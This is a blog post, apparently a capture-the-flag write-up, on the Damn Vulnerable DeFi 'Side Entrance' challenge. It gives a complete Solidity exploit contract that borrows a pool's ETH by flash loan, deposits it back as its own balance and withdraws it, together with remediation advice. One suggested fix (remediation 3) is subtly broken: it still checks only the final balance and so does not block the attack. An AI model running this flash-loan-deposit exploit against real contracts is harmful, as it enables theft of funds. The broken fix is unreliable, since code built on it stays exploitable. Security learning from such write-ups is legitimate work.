---
title: 'Damn Vulnerable Defi : Side Entrance'
date: 2025-04-14
description: 'Solving the Side Entrance challenge from Damn Vulnerable DeFi.'
tags: ['web3', 'solidity', 'ctf']
image: '/images/blog/2025/damn-vulnerable-defi-side_entrance.png'
---

The "Side Entrance" challenge from Damn Vulnerable DeFi presents us with an interesting vulnerability in a lending pool contract. This challenge highlights a critical issue that can arise when a contract fails to properly distinguish between its internal accounting system and the actual balance of funds it holds.

## Challenge Overview

The challenge description is elegantly simple:

> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
>
> It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
>
> You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.

We're presented with a lending pool contract that has 1000 ETH. Our goal is to drain all these funds even though we only start with 1 ETH.

## Understanding the Contract

Let's analyze the `SideEntranceLenderPool` contract to identify its functionality and potential vulnerabilities:

```solidity
contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
}
```

The contract has three main functions:

1. **deposit()**: Allows users to deposit ETH and records it in the `balances` mapping.
2. **withdraw()**: Allows users to withdraw their recorded balance.
3. **flashLoan()**: Provides a flash loan facility where users can borrow ETH temporarily and must return it within the same transaction.

## Identifying the Vulnerability

The vulnerability in this contract stems from a fundamental misalignment between two systems:

1. **The External Balance**: The actual ETH balance of the contract (`address(this).balance`)
2. **The Internal Accounting**: The record of user deposits in the `balances` mapping

In secure financial contracts, these two systems should remain in sync or have clear reconciliation mechanisms. However, the `SideEntranceLenderPool` fails to maintain this alignment in a critical way.

When we look at the `flashLoan()` function, we notice that it only verifies that the contract's balance after the loan execution is not less than it was before. It does not enforce *how* this balance is maintained. The function checks:

```solidity
if (address(this).balance < balanceBefore) {
    revert RepayFailed();
}
```

Meanwhile, the `deposit()` function updates the user's internal balance record when ETH is sent to the contract:

```solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}
```

The critical insight is that these two systems can be manipulated to work against each other: the flash loan verification can be satisfied while simultaneously gaining credit in the internal accounting system.

## The Exploit Mechanism

The exploit leverages this misalignment through a clever "side entrance" that goes like this:

1. Request a flash loan for all available ETH in the pool (1000 ETH)
2. Rather than directly returning the ETH, call the `deposit()` function with the borrowed ETH
3. This satisfies the flash loan verification (the contract's ETH balance remains the same) while also crediting our account in the `balances` mapping
4. Then call `withdraw()` to retrieve the ETH based on our artificially inflated balance

The beauty of this exploit is that we're essentially using the pool's own ETH to credit ourselves in its accounting system. We never actually bring any new ETH to the table (besides gas costs), yet we walk away with all 1000 ETH.

## Exploit Implementation

Here's a step-by-step implementation of the exploit:

```solidity
contract SideEntranceExploiter {
    SideEntranceLenderPool private immutable pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    // Main attack function
    function attack() external {
        // 1. Request a flash loan for all ETH in the pool
        pool.flashLoan(address(pool).balance);
    }

    // This function is called by the pool during the flash loan execution
    function execute() external payable {
        // 2. Instead of directly returning the ETH, deposit it back
        // This satisfies the flash loan check while crediting our balance
        pool.deposit{value: msg.value}();
    }

    // After the attack, withdraw and send to recovery address
    function withdrawToRecovery(address recovery) external {
        // 3. Withdraw all ETH based on our credited balance
        pool.withdraw();

        // 4. Send the drained ETH to the recovery address
        payable(recovery).transfer(address(this).balance);
    }

    // Required to receive ETH
    receive() external payable {}
}
```

The attack flow in a test scenario would look like this:

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    // Create exploiter contract
    SideEntranceExploiter exploiter = new SideEntranceExploiter(address(pool));

    // Execute the attack
    exploiter.attack();

    // Withdraw the ETH to the recovery address
    exploiter.withdrawToRecovery(recovery);
}
```

## Diving Deeper: The Double-Entry Problem

This vulnerability is fundamentally a failure of double-entry accounting principles. In traditional accounting, every transaction affects at least two accounts, ensuring that debits equal credits. In blockchain contracts, this principle should translate to maintaining consistent relationships between:

1. The actual asset balances (ETH or tokens stored in the contract)
2. The recorded liabilities (promised assets to users)

The `SideEntranceLenderPool` fails to enforce this consistency by allowing the same ETH to satisfy both:
- The flash loan repayment verification
- The deposit crediting system

In essence, the contract allows the same funds to be "double-counted", once as a successful flash loan repayment and once as a new deposit. This violation of accounting principles leads directly to the exploit.

## Remediation Strategies

Several approaches could be used to fix this vulnerability:

1. **Track flash loans in progress**: Prevent deposit/withdraw functions from being called during an active flash loan.

```solidity
bool private flashLoanLock;

modifier noReentrance() {
    require(!flashLoanLock, "ReentrancyGuard: reentrant call");
    flashLoanLock = true;
    _;
    flashLoanLock = false;
}

function deposit() external payable noReentrance { ... }
function withdraw() external noReentrance { ... }
function flashLoan(uint256 amount) external noReentrance { ... }
```

2. **Separate flash loan pool**: Maintain a separate pool of assets for flash loans that cannot be withdrawn by users.

3. **Use direct transfers for repayment**: Instead of allowing any method of fund return, explicitly require direct transfers back to the contract rather than checking only the final balance.

```solidity
function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    // Send loan
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    // Require direct repayment, not just same balance
    require(
        address(this).balance >= balanceBefore + flashFee(amount),
        "Direct repayment required"
    );
}
```

4. **Full accounting reconciliation**: Maintain a complete accounting system that tracks all funds entering and leaving the contract, with reconciliation checks.

## Conclusion

The "Side Entrance" challenge elegantly demonstrates how seemingly minor oversights in contract design can lead to catastrophic fund loss. The core vulnerability failing to maintain alignment between actual balances and internal accounting.
